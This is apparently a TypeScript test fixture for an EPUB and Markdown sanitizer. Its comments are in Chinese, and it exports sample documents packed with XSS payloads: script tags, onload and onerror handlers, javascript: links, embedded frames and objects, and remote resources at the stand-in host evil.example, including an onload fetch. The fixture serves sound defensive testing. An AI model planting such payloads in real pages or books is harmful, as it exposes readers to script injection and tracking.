/**
 * 恶意阅读材料夹具。
 *
 * 夹具故意同时包含主动脚本、嵌入对象、事件属性、危险 URL、远程资源和
 * 协议相对 URL，供 EPUB XHTML 与 Markdown 的同一套清洗边界复用。
 */
export const MALICIOUS_EPUB_XHTML = `
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <title>不可信 EPUB</title>
    <link rel="stylesheet" href="https://evil.example/remote.css" />
    <style>
      @import "https://evil.example/import.css";
      @font-face { font-family: remote; src: url("https://evil.example/remote.woff") }
      body { background-image: url("https://evil.example/remote.png") }
    </style>
  </head>
  <body onload="fetch('https://evil.example/boot')">
    <script>window.__bookPayload = 'executed';</script>
    <iframe src="https://evil.example/frame"></iframe>
    <object data="https://evil.example/object"></object>
    <embed src="https://evil.example/embed" />
    <audio controls src="media/audio.mp3"><source src="media/audio.mp3" /><track src="media/captions.vtt" /></audio>
    <video controls src="media/video.mp4" poster="media/poster.png"></video>
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('svg')">
      <script>alert('svg-script')</script>
      <image href="https://evil.example/svg.png" />
    </svg>
    <a href="javascript:alert('xss')">危险链接</a>
    <img src="https://evil.example/remote.png" />
    <img src="//evil.example/tracker.png" onerror="alert('xss')" />
    <p>应保留的 EPUB 正文</p>
  </body>
</html>`;

export const MALICIOUS_MARKDOWN = `# 不可信 Markdown

正文应保留。

<script>window.__markdownPayload = 'executed';</script>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/object"></object>
<img src="https://evil.example/remote.png">
<img src="//evil.example/tracker.png" onerror="alert('xss')">
[危险链接](javascript:alert('xss'))
`;
